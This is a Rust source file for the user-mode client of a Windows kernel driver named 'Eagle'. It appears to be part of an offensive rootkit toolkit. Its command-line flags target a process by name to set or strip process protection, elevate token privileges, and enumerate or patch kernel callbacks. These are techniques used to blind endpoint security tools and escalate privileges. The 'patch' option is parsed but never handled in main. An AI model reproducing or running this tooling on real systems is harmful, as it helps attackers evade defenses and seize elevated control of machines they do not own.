use sysinfo::{Pid, SystemExt, ProcessExt};
use winapi::um::{fileapi::{CreateFileA, OPEN_EXISTING}, winnt::{GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE}, handleapi::CloseHandle};
use std::{ffi::CString, ptr::null_mut};
mod kernel_interface;
use clap::Parser;
use clap::ArgGroup;

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
#[clap(group(
            ArgGroup::new("client")
                .required(true)
                .args(&["protect", "unprotect", "token", "enumerate", "patch"]),
))]
struct Cli {
    /// Target process name
    #[clap(long, value_name = "NAME")]
    process: String,

    /// Elevate process privileges
    #[clap(long)]
    protect: bool,

    /// Restore process privileges
    #[clap(long)]
    unprotect: bool,

    /// Elevate token privileges
    #[clap(long)]
    token: bool,

    /// Enumerate kernel callbacks
    #[clap(long)]
    enumerate: bool,

    /// Patch kernel callbacks
    #[clap(long)]
    patch: bool,
}

fn main() {

    let cli = Cli::parse();

    let process_id = get_process_id_by_name(cli.process.as_str()) as u32;
    //let protect = args.protect.unwrap();
    //let enumerate = args.enumerate.unwrap();


    let file = CString::new("\\\\.\\Eagle").unwrap().into_raw() as *const i8;
    let driver_handle = unsafe { 
        CreateFileA(
        file,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null_mut(),
        OPEN_EXISTING,
        0,
        null_mut())
    };

    if driver_handle.is_null() {
        panic!("[-] Failed to get a handle to the driver");
    }

    println!("File Handle {:?}", driver_handle);
    println!("Process ID: {:?}", process_id);


    if cli.protect {
        kernel_interface::protect_process(process_id, driver_handle);
    } else if cli.unprotect {
        kernel_interface::unprotect_process(process_id, driver_handle);
    } else if cli.token {
        kernel_interface::enable_tokens(process_id, driver_handle);
    } else if cli.enumerate {
        kernel_interface::enumerate_callbacks(driver_handle);
    } else {
        println!("Invalid Options");
    }

    unsafe { CloseHandle(driver_handle) };
}

/// Get process ID by name
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}